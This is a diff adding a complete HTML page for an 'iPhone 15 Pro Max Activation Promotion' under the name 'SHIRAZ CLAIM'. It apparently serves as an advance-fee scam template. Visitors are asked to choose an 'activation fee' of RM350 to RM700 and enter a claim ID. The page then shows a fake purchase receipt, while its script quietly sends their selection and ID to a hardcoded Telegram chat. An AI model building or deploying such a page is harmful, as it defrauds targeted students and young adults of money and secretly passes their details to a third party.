@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iPhone 15 Pro Max Activation Promotion</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    header {
+      background-color: #222;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 1.8em;
+    }
+
+    header p {
+      font-size: 1em;
+      margin: 5px 0;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+      background: white;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .product-image img {
+      width: 100%;
+      border-radius: 8px;
+    }
+
+    .product-description {
+      margin-top: 20px;
+    }
+
+    .product-description h2 {
+      font-size: 1.4em;
+      margin-bottom: 10px;
+    }
+
+    .product-description p {
+      margin: 5px 0 15px;
+      line-height: 1.5;
+    }
+
+    .price-options {
+      margin-top: 20px;
+    }
+
+    .price-options h3 {
+      margin-bottom: 10px;
+    }
+
+    .option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px;
+      background-color: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+
+    .option input[type="radio"] {
+      margin-right: 10px;
+    }
+
+    .option span {
+      font-size: 1.2em;
+      font-weight: bold;
+    }
+
+    .btn {
+      display: inline-block;
+      background: #007bff;
+      color: white;
+      padding: 10px 15px;
+      text-align: center;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+      margin-top: 20px;
+      width: 100%;
+    }
+
+    .btn:hover {
+      background: #0056b3;
+    }
+
+    #confirmation-box {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 400px;
+      background: white;
+      padding: 20px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+    }
+
+    #confirmation-box h3 {
+      margin-top: 0;
+    }
+
+    #thank-you {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>iPhone 15 Pro Max Activation Promotion</h1>
+    <p>Sponsored by SHIRAZ CLAIM</p>
+  </header>
+
+  <div class="container">
+    <!-- Product Image and Description -->
+    <div class="product-image">
+      <img src="https://i.imghippo.com/files/qbyr1952TU.png" alt="" border="0">
+    </div>
+
+    <div class="product-description">
+      <h2>Product Highlights</h2>
+      <p><strong>Device:</strong> iPhone 15 Pro Max</p>
+      <p><strong>Key Features:</strong> Titanium design, A17 Pro chip, 120Hz ProMotion display.</p>
+      <p><em>Shiraz iDevice claim is a supportive device for students and young adults to enhance learning and productivity.</em></p>
+    </div>
+
+    <!-- Pricing Options -->
+    <div class="price-options">
+      <h3>Activation Fee Options</h3>
+      <div class="option">
+        <label>
+          <input type="radio" name="storage" value="256GB|RM350">
+          256GB (Activation Fee: RM350)
+        </label>
+      </div>
+      <div class="option">
+        <label>
+          <input type="radio" name="storage" value="512GB|RM420">
+          512GB (Activation Fee: RM420)
+        </label>
+      </div>
+      <div class="option">
+        <label>
+          <input type="radio" name="storage" value="1TB|RM700">
+          1TB (Activation Fee: RM700)
+        </label>
+      </div>
+    </div>
+
+    <button class="btn" onclick="confirmSelection()">Proceed</button>
+  </div>
+
+  <!-- Confirmation Box -->
+  <div id="confirmation-box">
+    <h3>Confirm Your Selection</h3>
+    <p id="selected-option"></p>
+    <input type="text" id="claim-id" placeholder="Enter Claim ID" style="width: 100%; padding: 10px; margin: 10px 0;">
+    <button class="btn" onclick="submitSelection()">Submit</button>
+  </div>
+
+  <!-- Thank You Message -->
+  <div id="thank-you">
+    <h3>Thank You for Your Purchase!</h3>
+    <p>Your receipt has been generated.</p>
+    <button class="btn" onclick="downloadReceipt()">Download PDF Receipt</button>
+  </div>
+
+  <script>
+    let selectedOption = '';
+
+    function confirmSelection() {
+      const selected = document.querySelector('input[name="storage"]:checked');
+      if (!selected) {
+        alert('Please select a storage option.');
+        return;
+      }
+      selectedOption = selected.value;
+      document.getElementById('selected-option').innerText = `You selected: ${selectedOption}`;
+      document.getElementById('confirmation-box').style.display = 'block';
+    }
+
+    function submitSelection() {
+      const claimId = document.getElementById('claim-id').value;
+      if (!claimId) {
+        alert('Please enter your Claim ID.');
+        return;
+      }
+      document.getElementById('confirmation-box').style.display = 'none';
+      document.getElementById('thank-you').style.display = 'block';
+
+      // Forward the selection details to Telegram
+      const telegramChatId = '7707842834'; // Replace with your Telegram chat ID
+      const botToken = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
+      const message = `User Selection:\nModel: ${selectedOption.split('|')[0]}\nFee: ${selectedOption.split('|')[1]}\nClaim ID: ${claimId}`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message,
+        }),
+      });
+    }
+
+    function downloadReceipt() {
+      const receiptContent = `
+        iPhone 15 Pro Max Activation Promotion\n
+        Selected Option: ${selectedOption.split('|')[0]}\n
+        Fee: ${selectedOption.split('|')[1]}\n
+        Claim ID: ${document.getElementById('claim-id').value}
+      `;
+      const blob = new Blob([receiptContent], { type: 'text/plain' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'receipt.txt';
+      a.click();
+    }
+  </script>
+</body>
+</html>
